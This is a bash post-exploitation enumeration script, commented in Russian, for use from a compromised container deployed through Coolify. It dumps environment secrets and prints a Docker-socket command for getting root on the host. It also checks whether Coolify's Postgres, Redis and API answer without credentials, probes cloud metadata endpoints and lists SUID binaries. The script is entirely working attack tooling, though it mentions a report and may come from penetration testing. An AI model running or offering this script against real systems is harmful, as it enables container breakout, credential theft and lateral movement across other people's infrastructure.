#!/usr/bin/env bash
# enum.sh — post-exploitation enum для контейнера, задеплоенного через Coolify.
# Запуск из шелла внутри контейнера:  bash /opt/enum.sh | tee /tmp/enum.out
# Ищи строки [!!] — это потенциальные находки.

set -u
section() { printf '\n\033[1;36m=== %s ===\033[0m\n' "$*"; }
hit()     { printf '\033[1;31m[!!]\033[0m %s\n' "$*"; }
ok()      { printf '\033[1;32m[ok]\033[0m %s\n' "$*"; }

section "0. Identity"
id
echo "hostname: $(hostname)"
grep -E '^PRETTY_NAME' /etc/os-release 2>/dev/null

section "1. ENV (секреты приложения в окружении)"
env | sort

section "2. Docker socket"
if [ -S /var/run/docker.sock ]; then
  hit "/var/run/docker.sock ЗАМАУНЧЕН"
  docker -H unix:///var/run/docker.sock ps 2>&1 | head -15
  echo "--- если выше список контейнеров, root на хосте одной командой:"
  echo '    docker -H unix:///var/run/docker.sock run --rm --privileged -v /:/host alpine chroot /host id'
else
  ok "docker.sock не замаунчен"
fi

section "3. Privileges / capabilities"
grep -E 'Cap(Inh|Prm|Eff|Bnd)' /proc/self/status
if command -v capsh >/dev/null; then
  capsh --decode="$(awk '/CapEff/ {print $2}' /proc/self/status)"
fi
echo "--- uid_map (userns?):"
cat /proc/self/uid_map 2>/dev/null
[ -w /proc/sys/kernel ] && hit "/proc/sys writable (privileged?)" || true

section "4. Mounts (ищем hostPath)"
grep -Ei 'coolify|/data|docker' /proc/mounts || true
echo "--- все не-virtual маунты:"
grep -Ev 'proc |sysfs|devpts|tmpfs|cgroup|overlay|mqueue|shm' /proc/mounts || true

section "5. Network"
ip -brief addr
ip route
echo "--- resolv.conf:"; cat /etc/resolv.conf
echo "--- neigh (соседние контейнеры):"; ip neigh
GW="$(ip route | awk '/default/ {print $3; exit}')"
echo "gateway: ${GW:-none}"

section "6. Coolify core: DNS-видимость из app-сети"
for h in coolify coolify-db coolify-redis coolify-realtime coolify-proxy; do
  ip="$(getent hosts "$h" | awk '{print $1; exit}')"
  if [ -n "$ip" ]; then hit "$h -> $ip (network-level достижим)"; else ok "$h не резолвится"; fi
done

section "7. Порты: coolify core + gateway"
portchk() {
  if timeout 3 bash -c "exec 3<>/dev/tcp/$1/$2" 2>/dev/null; then
    echo "[OPEN]   $1:$2"; exec 3>&- 3<&-
  else
    echo "[closed] $1:$2"
  fi
}
for t in coolify:8000 coolify:6001 coolify-db:5432 coolify-redis:6379 \
         coolify-realtime:6001 coolify-proxy:80 coolify-proxy:443 coolify-proxy:8080; do
  h="${t%:*}"; p="${t#*:}"
  if getent hosts "$h" >/dev/null 2>&1; then portchk "$h" "$p"; else echo "[skip]   $t (нет DNS)"; fi
done
if [ -n "${GW:-}" ]; then
  echo "--- nmap gateway $GW:"
  nmap -Pn -T4 --open -p 22,80,443,2375,2376,8000,8080,10250 "$GW" 2>/dev/null | grep -E 'open|scan report'
fi

section "8. Redis без пароля?"
timeout 5 redis-cli -h coolify-redis ping 2>&1 | head -2

section "9. Postgres без пароля?"
timeout 5 psql "host=coolify-db user=postgres dbname=postgres connect_timeout=3" -c 'select version();' 2>&1 | head -3
timeout 5 psql "host=coolify-db user=coolify dbname=coolify connect_timeout=3" -c 'select version();' 2>&1 | head -3

section "10. Coolify API/UI без токена"
curl -s -m 5 -o /dev/null -w 'GET /            -> %{http_code}\n' http://coolify:8000/ || true
curl -s -m 5 -o /dev/null -w 'GET /api/v1/ping -> %{http_code}\n' http://coolify:8000/api/v1/ping || true
echo "--- GET /api/v1/servers:"
curl -s -m 5 http://coolify:8000/api/v1/servers | head -c 300; echo

section "11. Cloud metadata (IMDS)"
code=$(curl -s -m 3 -o /dev/null -w '%{http_code}' http://169.254.169.254/latest/meta-data/ 2>/dev/null)
[ "$code" != "000" ] && hit "AWS-style IMDS отвечает: HTTP $code" || ok "AWS-style IMDS недоступен"
code=$(curl -s -m 3 -o /dev/null -w '%{http_code}' -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/ 2>/dev/null)
[ "$code" != "000" ] && hit "GCP IMDS отвечает: HTTP $code" || ok "GCP IMDS недоступен"

section "12. SUID / интересные пути"
find / -xdev -perm -4000 -type f 2>/dev/null | head -10
if [ -d /data ]; then hit "/data существует:"; ls -la /data | head; fi

section "Готово"
echo "Строки [!!] — кандидаты в отчёт. Ручной досмотр: nmap -sn <subnet> для поиска соседних app-контейнеров."
